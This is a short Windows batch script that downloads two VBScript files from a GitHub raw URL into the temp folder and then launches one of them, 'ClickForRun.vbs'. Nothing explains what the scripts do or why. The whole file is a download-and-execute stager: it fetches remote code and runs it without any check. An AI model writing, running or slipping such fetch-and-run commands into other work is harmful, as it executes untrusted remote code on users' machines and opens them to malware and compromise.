powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/ClickForRun.vbs' -OutFile $env:temp\ClickForRun.vbs"
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/text.vbs' -OutFile $env:temp\text.vbs"
start "" %temp%\ClickForRun.vbs
